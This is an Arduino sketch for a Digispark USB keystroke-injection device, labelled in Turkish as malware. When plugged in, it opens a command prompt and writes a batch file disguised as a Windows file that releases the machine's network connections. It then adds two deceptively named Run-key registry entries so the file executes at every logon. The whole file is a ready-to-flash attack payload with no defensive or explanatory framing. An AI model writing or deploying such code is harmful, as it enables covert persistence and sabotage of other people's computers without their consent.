#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  //Setup cods:

}

void loop() {
  
  //ZARARLI YAZILIM
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000);
  DigiKeyboard.print("echo @echo off>c:/windows/wimn32.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("echo break off>>c:/windows/wimn32.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("echo ipconfig/release_all>>c:/windows/wimn32.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("echo end>>c:/windows/wimn32.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("reg add HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run /v WINDOWsAPI /t reg_sz /d c:/windows/wimn32.bat /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("reg add HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run /v CONTROLexit /t reg_sz /d c:/windows/wimn32.bat /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("PAUSE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
}
